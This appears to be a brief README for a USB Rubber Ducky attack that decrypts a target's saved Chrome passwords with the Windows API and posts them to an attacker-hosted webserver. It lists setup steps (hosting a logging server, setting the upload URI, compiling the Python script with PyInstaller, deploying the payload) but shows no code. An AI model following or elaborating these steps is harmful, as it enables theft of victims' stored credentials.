This is a improved version of the [Password Stealer](https://github.com/Nuk3leus/Ducky-chrome-password-stealer "GitHub"), written by Nuk3leus, based on the [python script](https://github.com/byt3bl33d3r/chrome-decrypter/blob/master/chrome_decrypt.py) from byt3bl33d3r. I figured out that the Chrome Password Database can be decrypted on the target pc. For this, we only need the user credentials, which the Windows API supplies nicely.

### Preparement
* Host a webserver which logs all authorized post requests 
* Adjust the URI, username and password in the python script 
* [Compile](http://www.pyinstaller.org/) the python script to an executable
* Upload the executable and adjust the payload
* Deploy the payload to your duck
